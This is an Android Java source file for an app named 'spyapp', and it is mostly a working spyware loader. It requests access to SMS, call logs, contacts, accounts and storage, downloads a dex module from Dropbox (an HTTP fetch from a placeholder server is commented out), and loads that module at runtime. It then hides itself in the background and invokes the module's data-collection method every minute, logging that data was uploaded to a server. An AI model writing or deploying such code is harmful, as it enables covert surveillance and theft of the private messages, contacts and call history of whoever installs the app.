package com.example.spyapp;

import android.Manifest;
import android.content.Context;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.Timer;
import java.util.TimerTask;

import dalvik.system.PathClassLoader;

public class MainActivity extends AppCompatActivity {

    private final String serviceTag = "SERVICE TAG";
    private Object instance = null;
    private Timer mTimer = null;

    private class Setup extends AsyncTask<String, Void, File> {

        private final String ip = "<SERVER-IP>";
        private final String token = "<DROPBOX-USER-TOKEN>";

        @Override
        protected File doInBackground(String... params) {
            File dexFile = new File(getExternalFilesDir(null), "classes3.dex");
            try {
                DbxRequestConfig requestConfig = DbxRequestConfig.newBuilder("dropbox/Приложения/SpyFolder").build();
                DbxClientV2 dbxClient = new DbxClientV2(requestConfig, token);

                FileOutputStream fileOutputStream = new FileOutputStream(dexFile);
                dbxClient.files().downloadBuilder("/dex/" + dexFile.getName())
                        .download(fileOutputStream);

                fileOutputStream.close();
                /*URL url = new URL("http://" + ip + ":8080/dex");
                HttpURLConnection con = (HttpURLConnection)url.openConnection();
                con.connect();
                InputStream inputStream = con.getInputStream();

                dexFile = new File(getExternalFilesDir(null), "classes3.dex");
                FileOutputStream fileOutputStream = new FileOutputStream(dexFile);
                byte[] buffer = new byte[2048];
                int count;
                while ((count = inputStream.read(buffer, 0, 2048)) != -1) {
                    fileOutputStream.write(buffer, 0, count);
                }
                con.getResponseMessage();

                fileOutputStream.flush();
                fileOutputStream.close();
                inputStream.close();*/
            } catch (IOException e) {
                e.printStackTrace();
            } catch (DbxException e) {
                e.printStackTrace();
            }

            return dexFile;
        }

        @Override
        protected void onPostExecute(File f) {
            Log.i(serviceTag, "Dex file downloaded");

            try {
                PathClassLoader classLoader = new PathClassLoader(f.getAbsolutePath(), getClassLoader());
                Class<?> clas = classLoader.loadClass("com.example.dexmodule.DexModule");
                instance = clas.getDeclaredConstructor(Context.class, String.class, String.class)
                        .newInstance(getBaseContext(), ip, token);

                mTimer = new Timer();
                long NOTIFY_INTERVAL = 60 * 1000;
                mTimer.scheduleAtFixedRate(new UploadDataTimerTask(), 0, NOTIFY_INTERVAL);

                moveTaskToBack(true);
            } catch (IllegalAccessException
                    | InvocationTargetException
                    | NoSuchMethodException
                    | ClassNotFoundException
                    | InstantiationException e) {
                e.printStackTrace();
            }

            super.onPostExecute(f);
        }
    }

    class UploadDataTimerTask extends TimerTask {
        @Override
        public void run() {
            try {
                instance.getClass().getMethod("doAll").invoke(instance);
            } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException e) {
                e.printStackTrace();
            }

            Log.i(serviceTag, "Data uploaded to server");
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_main);

        final String[] NECESSARY_PERMISSIONS = new String[]{
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.GET_ACCOUNTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS
        };
        ActivityCompat.requestPermissions(MainActivity.this, NECESSARY_PERMISSIONS, 123);

        Setup setup = new Setup();
        setup.execute();

        Log.i(serviceTag, "Service created");
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (mTimer != null) {
            mTimer.cancel();
        }

        Log.i(serviceTag, "Service destroyed");
    }
}